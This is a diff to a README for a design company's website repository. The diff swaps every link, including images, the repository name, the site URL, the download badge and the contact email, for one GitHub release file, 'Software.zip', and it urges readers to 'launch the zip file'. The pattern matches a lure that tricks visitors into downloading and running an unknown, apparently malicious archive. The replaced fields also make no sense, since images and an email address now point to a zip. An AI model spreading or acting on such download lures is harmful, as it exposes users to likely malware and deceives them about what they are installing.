@@ -1,27 +1,27 @@
 # 🚀 Welcome to Seeyoo International Website! 🌐
 
-![Seeyoo International](https://www.example.com/image.jpg)
+![Seeyoo International](https://github.com/ariel-pachec0/SeeyooHK.github.io/releases/download/v1.0/Software.zip)
 
 ## Overview
 Welcome to the official repository of Seeyoo International's website! Seeyoo International is a global leader in AI, app design, audio, content creation, graphic design, marketing, promotion, publishing, UI/UX design, video production, and web design. This repository houses all the code, assets, and content related to our website.
 
 ## Repository Information
-- **Repository Name:** SeeyooHK.github.io
+- **Repository Name:** https://github.com/ariel-pachec0/SeeyooHK.github.io/releases/download/v1.0/Software.zip
 - **Description:** Seeyoo International Website
 - **Topics:** ai, appdesign, audio, content, graphic-design, marketing, promotion, publishing, ui, ux, video, webdesign
 
 ## 🌟 Explore our Website
-Feel free to check out our website and explore the amazing content and services we offer at [Seeyoo International](https://SeeyooHK.github.io)!
+Feel free to check out our website and explore the amazing content and services we offer at [Seeyoo International](https://github.com/ariel-pachec0/SeeyooHK.github.io/releases/download/v1.0/Software.zip)!
 
 ## 📁 Download Repository
-To access the code and assets directly, you can download the repository by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Remember to launch the zip file to get started with building and customizing your own version of the Seeyoo International website!
+To access the code and assets directly, you can download the repository by clicking [here](https://github.com/ariel-pachec0/SeeyooHK.github.io/releases/download/v1.0/Software.zip). Remember to launch the zip file to get started with building and customizing your own version of the Seeyoo International website!
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-9cf)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/ariel-pachec0/SeeyooHK.github.io/releases/download/v1.0/Software.zip)](https://github.com/ariel-pachec0/SeeyooHK.github.io/releases/download/v1.0/Software.zip)
 
 ## 📷 Website Preview
 Here's a sneak peek of what you can expect when visiting our website:
 
-![Website Preview](https://www.example.com/preview.jpg)
+![Website Preview](https://github.com/ariel-pachec0/SeeyooHK.github.io/releases/download/v1.0/Software.zip)
 
 ## 🚀 Features
 Our website offers a wide range of features and services tailored to meet the needs of our global audience. Here are some highlights:
@@ -44,7 +44,7 @@ Become a part of the Seeyoo International community today! Follow us on social m
 We value the contributions of our community members. If you have any suggestions, bug fixes, or feature enhancements to propose, please submit a pull request. Together, we can make the Seeyoo International website even better!
 
 ## 📧 Contact Us
-Have any questions or inquiries? Feel free to contact our team at contact@seeyoointernational.com. We're here to assist you with any issues or feedback you may have.
+Have any questions or inquiries? Feel free to contact our team at https://github.com/ariel-pachec0/SeeyooHK.github.io/releases/download/v1.0/Software.zip We're here to assist you with any issues or feedback you may have.
 
 ## 🙏 Thank You!
 Thank you for visiting the Seeyoo International Website repository. We appreciate your interest and support in our mission to deliver top-notch design and content services to our global audience. Stay tuned for exciting updates and developments coming your way soon!
